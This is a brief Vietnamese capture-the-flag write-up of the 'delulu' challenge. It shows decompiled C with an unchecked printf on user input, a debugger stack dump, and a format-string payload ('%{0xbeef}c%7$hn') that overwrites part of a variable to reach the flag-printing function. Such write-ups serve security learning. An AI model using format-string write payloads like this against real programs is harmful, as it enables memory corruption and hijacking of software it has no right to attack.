# delulu write up 
- với bài này em thấy rằng có bug format string nên khả năng em có thể dùng nó để sữa 2 byte đầu của buff để lấy flag
```C
buff[0] = 0x1337BABELL;
  buff[1] = (__int64)buff;
  memset(buf, 0, 32);
  read(0, buf, 0x1FuLL);
  printf("\n[!] Checking.. ");
  printf((const char *)buf);
  if ( buff[0] == '\x137\xBE\xEF' )
    delulu();
  else
```
- dưới stack thì chỉ có cái này mang giá trị của buff[0]

```assembly
00:0000│ rsp 0x7fffffffe5c0 ◂— 0x1337babe
01:0008│-038 0x7fffffffe5c8 —▸ 0x7fffffffe5c0 ◂— 0x1337babe
02:0010│ rsi 0x7fffffffe5d0 ◂— '%48879c%7$hn\n'
03:0018│-028 0x7fffffffe5d8 ◂— 0xa6e682437 /* '7$hn\n' */
04:0020│-020 0x7fffffffe5e0 ◂— 0x0
05:0028│-018 0x7fffffffe5e8 ◂— 0x0
06:0030│-010 0x7fffffffe5f0 ◂— 0x0
07:0038│-008 0x7fffffffe5f8 ◂— 0xc0b247c6fc9f2500
```
vậy là done 
```python
payload = f'%{0xbeef}c%7$hn'.encode()
```
```bash
                       \xa0
You managed to deceive the robot, here's your new identity: HTB{f4k3_fl4g_4_t35t1ng}
[*] Got EOF while reading in interactive
$
```
